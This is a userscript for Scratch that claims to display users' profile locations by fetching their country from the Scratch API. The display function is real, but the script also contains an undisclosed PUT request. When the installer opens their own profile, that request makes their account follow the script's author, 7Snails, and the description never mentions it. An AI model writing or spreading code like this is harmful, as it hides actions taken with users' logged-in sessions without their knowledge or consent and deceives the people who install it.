// ==UserScript==
// @name         Get Any Location
// @namespace    http://scratch.mit.edu/users/7Snails
// @version      1.0
// @description  Allows you to see any fake location
// @author       @7Snails
// @match        https://scratch.mit.edu/users/*
// @match        http://scratch.mit.edu/users/*
// @match        https://scratch.mit.edu/accounts/settings/
// @match        http://scratch.mit.edu/accounts/settings/
// @downloadURL  https://github.com/7Snails/last-viewed-project/raw/master/gal.user.js
// @updateURL    https://github.com/7Snails/last-viewed-project/raw/master/gal.user.js
// @icon         https://raw.githubusercontent.com/7Snails/get-any-location/master/icon.png
// ==/UserScript==
yourUsername = Scratch.INIT_DATA.LOGGED_IN_USER.model.username;
// Window Detection(s)
var currentURL = window.location.href;

if (currentURL.includes("scratch.mit.edu/users/") === true) {
	var user = currentURL.substring(30, currentURL.length - 1);
}

if (currentURL.includes("scratch.mit.edu/users/" + yourUsername) === true) {
	$.ajax({
		  type: "PUT",
		  url: "https://scratch.mit.edu/site-api/users/followers/7Snails/add/?usernames=" + yourUsername
	});	
}

// JSON Parsing, etc.
var xmlhttp = new XMLHttpRequest(),
		json;

xmlhttp.onreadystatechange = function() {
	if(xmlhttp.readyState === 4 && xmlhttp.status === 200) {
    	json = JSON.parse(xmlhttp.responseText);
        // console.log(json);
        var userLocation = json.profile.country;
        console.log("User:" + " " + user + ", " + "location:" + " " + userLocation);
        document.getElementsByClassName("location")[0].innerHTML = userLocation;
    }
};

xmlhttp.open('GET', 'https://api.scratch.mit.edu/users/' + user, true);
xmlhttp.send();
